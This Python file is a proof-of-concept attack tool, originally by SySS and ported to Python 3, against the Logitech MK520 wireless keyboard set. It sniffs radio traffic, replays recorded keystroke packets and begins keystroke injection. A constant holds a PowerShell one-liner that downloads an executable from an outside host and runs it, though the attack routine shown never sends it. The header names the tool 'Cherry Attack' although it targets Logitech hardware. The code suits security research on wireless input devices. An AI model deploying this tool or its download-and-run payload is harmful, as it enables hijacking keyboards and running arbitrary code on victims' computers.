#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
  Cherry Attack

  by Matthias Deeg <matthias.deeg@syss.de> and
  Gerhard Klostermeier <gerhard.klostermeier@syss.de>

  Proof-of-Concept software tool to demonstrate the replay
  and keystroke injection vulnerabilities of the wireless desktop set
  Logitech MK520

  Copyright (C) 2016 SySS GmbH
  
  
  Einstein2150 (Update 2024):
  This program has been migrated and further developed for use with
  Python 3 by Einstein2150. The author acknowledges that ongoing
  enhancements and updates to the codebase may continue in the future.
  Users should be aware that the use of this program is at their own
  risk, and the author accepts no responsibility for any damages that
  may arise from its use. It is the user's responsibility to ensure 
  that their use of the program complies with all applicable laws 
  and regulations.
  

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""

__version__ = '0.9'
__author__ = 'Einstein2150'

import argparse
import logging
import pygame
from binascii import hexlify, unhexlify
from lib import keyboard
from lib import nrf24
from logging import debug, info
from pygame.locals import *
from time import sleep, time
from sys import exit

# constants
ATTACK_VECTOR = "powershell (new-object System.Net.WebClient).DownloadFile('http://ptmd.sy.gs/syss.exe', '%TEMP%\\syss.exe'); Start-Process '%TEMP%\\syss.exe'"

RECORD_BUTTON = pygame.K_1  # record button
REPLAY_BUTTON = pygame.K_2  # replay button
ATTACK_BUTTON = pygame.K_3  # attack button
SCAN_BUTTON = pygame.K_4  # scan button

IDLE = 0  # idle state
RECORD = 1  # record state
REPLAY = 2  # replay state
SCAN = 3  # scan state
ATTACK = 4  # attack state

SCAN_TIME = 2  # scan time in seconds for scan mode heuristics
DWELL_TIME = 0.1  # dwell time for scan mode in seconds
KEYSTROKE_DELAY = 0.01  # keystroke delay in seconds

SCAN_CHANNELS = list(range(2, 84))  # Default range from 2 to 84 (inclusive)

# Logitech Unifying Keep Alive packet with 90 ms
KEEP_ALIVE_90 = unhexlify("0040005A66")
KEEP_ALIVE_TIMEOUT = 0.07


class LogitechAttack():
    """Logitech Attack"""

    def __init__(self, address=""):
        """Initialize Logitech Attack"""

        self.state = IDLE  # current state
        self.channel = 2  # used ShockBurst channel
        self.payloads = []  # list of sniffed payloads
        self.kbd = None  # keyboard for keystroke injection attacks
        self.screen = None  # screen
        self.font = None  # font
        self.statusText = ""  # current status text
        self.address = address

        try:
            # initialize pygame variables
            pygame.init()
            self.icon = pygame.image.load("./images/syss_logo.png")
            self.bg = pygame.image.load("./images/logitech_attack_bg.png")

            pygame.display.set_caption("SySS Logitech Attack PoC")
            pygame.display.set_icon(self.icon)
            self.screen = pygame.display.set_mode((400, 300), 0, 24)
            self.font = pygame.font.SysFont("arial", 24)
            self.screen.blit(self.bg, (0, 0))
            pygame.display.update()

            # set key repetition parameters
            pygame.key.set_repeat(250, 50)

            # initialize radio
            self.radio = nrf24.nrf24()

            # enable LNA
            self.radio.enable_lna()

            # start scanning mode
            self.setState(SCAN)
        except Exception as e:
            # info output
            info(f"[-] Error: Could not initialize Logitech Attack: {e}")

    def showText(self, text, x=40, y=140):
        output = self.font.render(text, True, (0, 0, 0))
        self.screen.blit(output, (x, y))

    def setState(self, newState):
        """Set state"""

        if newState == RECORD:
            self.state = RECORD
            self.statusText = "RECORDING"
        elif newState == REPLAY:
            self.state = REPLAY
            self.statusText = "REPLAYING"
        elif newState == SCAN:
            self.state = SCAN
            self.statusText = "SCANNING"
        elif newState == ATTACK:
            self.state = ATTACK
            self.statusText = "ATTACKING"
        else:
            self.state = IDLE
            self.statusText = "IDLING"

    def unique_everseen(self, seq):
        """Remove duplicates from a list while preserving the item order"""
        seen = set()
        return [x for x in seq if str(x) not in seen and not seen.add(str(x))]

    def run(self):
        # main loop
        last_keep_alive = time()
        running = True
        while running:
            for i in pygame.event.get():
                if i.type == QUIT:
                    running = False

                elif i.type == KEYDOWN:
                    if i.key == K_ESCAPE:
                        running = False

                    # record button state transitions
                    if i.key == RECORD_BUTTON:
                        if self.state == IDLE:
                            self.setState(RECORD)
                            self.payloads = []
                        elif self.state == RECORD:
                            self.setState(IDLE)

                    # play button state transitions
                    if i.key == REPLAY_BUTTON:
                        if self.state == IDLE:
                            self.setState(REPLAY)

                    # scan button state transitions
                    if i.key == SCAN_BUTTON:
                        if self.state == IDLE:
                            self.setState(SCAN)

                    # attack button state transitions
                    if i.key == ATTACK_BUTTON:
                        if self.state == IDLE:
                            self.setState(ATTACK)

            # show current status on screen
            self.screen.blit(self.bg, (0, 0))
            self.showText(self.statusText)

            # update the display
            pygame.display.update()

            # state machine
            if self.state == RECORD:
                # receive payload
                value = self.radio.receive_payload()

                if value[0] == 0:
                    # split the payload from the status byte
                    payload = value[1:]

                    # add payload to list
                    self.payloads.append(payload)

                    # info output, show packet payload
                    info('Received payload: {0}'.format(hexlify(payload)))

            elif self.state == REPLAY:
                # remove duplicate payloads (retransmissions)
                payloadList = self.unique_everseen(self.payloads)

                # replay all payloads
                for p in payloadList:
                    if len(p) == 22:
                        # transmit payload
                        self.radio.transmit_payload(p.tobytes())

                        # info output
                        info('Sent payload: {0}'.format(hexlify(p)))

                        # send keep alive with 90 ms time out
                        self.radio.transmit_payload(KEEP_ALIVE_90)
                        last_keep_alive = time()

                        sleep(KEYSTROKE_DELAY)

                # set IDLE state after playback
                self.setState(IDLE)

            elif self.state == SCAN:
                # put the radio in promiscuous mode with given address
                if len(self.address) > 0:
                    self.radio.enter_promiscuous_mode(self.address[::-1])
                else:
                    self.radio.enter_promiscuous_mode()

                # set the initial channel
                self.radio.set_channel(SCAN_CHANNELS[0])

                # sweep through the defined channels and decode ESB packets in pseudo-promiscuous mode
                last_tune = time()
                channel_index = 0
                while True:
                    # increment the channel
                    if len(SCAN_CHANNELS) > 1 and time() - last_tune > DWELL_TIME:
                        channel_index = (channel_index + 1) % len(SCAN_CHANNELS)
                        self.radio.set_channel(SCAN_CHANNELS[channel_index])
                        last_tune = time()

                    # receive payloads
                    value = self.radio.receive_payload()
                    if len(value) >= 5:
                        # split the address and payload
                        address, payload = value[0:5], value[5:]

                        # convert address to string and reverse byte order
                        converted_address = address[::-1].tobytes()
                        self.address = converted_address
                        break

                self.showText("Found keyboard")
                address_string = ':'.join('{:02X}'.format(b) for b in address)
                self.showText(address_string)

                # info output
                info("Found nRF24 device with address {0} on channel {1}".format(address_string, SCAN_CHANNELS[channel_index]))

                # put the radio in sniffer mode (ESB w/o auto ACKs)
                self.radio.enter_sniffer_mode(self.address)

                info("Searching crypto key")
                self.statusText = "SEARCHING"
                self.screen.blit(self.bg, (0, 0))
                self.showText(self.statusText)
                pygame.display.update()

                # get the address of the target keyboard
                # WARNING: The following function blocks and can take a long time, depending on the number of packets
                while self.state == SCAN:
                    value = self.radio.receive_payload()
                    if value[0] == 0:
                        payload = value[1:]

                        if len(payload) > 2:
                            # info output
                            info("Received payload: {0}".format(hexlify(payload)))
                            if len(payload) == 22:
                                self.payloads.append(payload)

                    # send keep alive every 90 ms
                    if time() - last_keep_alive >= KEEP_ALIVE_TIMEOUT:
                        self.radio.transmit_payload(KEEP_ALIVE_90)
                        last_keep_alive = time()

            elif self.state == ATTACK:
                # info output
                info("Starting attack!")

                # initialize keyboard
                self.kbd = keyboard.Keyboard()
                self.kbd.set_delay(200)

                self.setState(IDLE)

        pygame.quit()


def main():
    """Main"""

    parser = argparse.ArgumentParser(description='Cherry Attack - Logitech MK520')
    parser.add_argument('-a', '--address', help='address of the target device (hex)', default="")
    args = parser.parse_args()

    # set up logging
    logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)

    # run the attack
    attack = LogitechAttack(args.address)
    attack.run()


if __name__ == "__main__":
    main()
